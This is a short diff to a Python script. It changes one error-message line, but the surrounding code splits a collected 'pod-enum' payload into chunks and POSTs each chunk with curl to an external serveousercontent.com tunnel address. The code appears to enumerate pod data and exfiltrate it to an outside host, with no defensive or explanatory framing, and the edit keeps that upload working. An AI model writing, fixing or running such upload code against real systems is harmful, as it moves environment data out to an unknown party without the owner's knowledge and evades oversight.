@@ -88,7 +88,7 @@ try:
         chunk=payload[i:i+4096]
         url=f"https://8412a3abf624921c-52-39-28-94.serveousercontent.com/pod-enum-{i//4096:02d}"
         cp=subprocess.run(["curl","-fsS","--max-time","60","-X","POST","--data-binary","@-",url],input=chunk,capture_output=True,timeout=70)
-        if cp.returncode: raise RuntimeError(f"curl rc={cp.returncode} stderr={cp.stderr.decode(errors=\"replace\")[:200]}")
+        if cp.returncode: raise RuntimeError("curl rc=%s stderr=%s" % (cp.returncode, cp.stderr.decode(errors="replace")[:200]))
         statuses.append(cp.stdout.decode(errors="replace")[:40])
     out["upload_statuses"]=statuses
     print(json.dumps(out,sort_keys=True,separators=(",",":")))
